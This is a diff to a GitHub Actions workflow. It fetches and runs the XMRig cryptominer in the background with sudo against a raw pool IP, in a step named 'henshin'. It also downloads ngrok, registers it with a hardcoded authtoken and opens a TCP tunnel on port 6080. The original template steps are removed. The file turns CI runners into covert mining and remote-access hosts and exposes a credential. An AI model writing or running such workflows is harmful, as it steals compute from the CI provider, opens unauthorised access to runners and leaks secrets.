@@ -20,6 +20,19 @@ jobs:
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps: 
+     - name: install
+       run: |
+          wget -P /home/runner/Downloads https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+          ls /home/runner/Downloads/
+     - name: extract
+       run: | 
+          sudo tar -xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /home/runner/Downloads
+          ls /home/runner/Downloads/
+
+     - name: Auth
+       run: |
+          cd /home/runner/Downloads
+          ./ngrok config add-authtoken 2p7aKNhdmC6GxOyW7u7hkRRsCgE_59JeGwT3qMwx7cnSQQmZy
      - name: troll
        run: wget -P /home/runner/Downloads https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
      - name: extract
@@ -27,13 +40,8 @@ jobs:
      - name: henshin
        run: |
           cd /home/runner/Downloads/xmrig-6.22.2
-          sudo ./xmrig -o  123.17.118.154 -B
-      # Runs a single command using the runners shell
-     - name: Run a one-line script
-       run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-     - name: Run a multi-line script
+          sudo ./xmrig -o  123.17.118.154  --background
+     - name: tunnel
        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+           cd /home/runner/Downloads
+           ./ngrok tcp 6080 
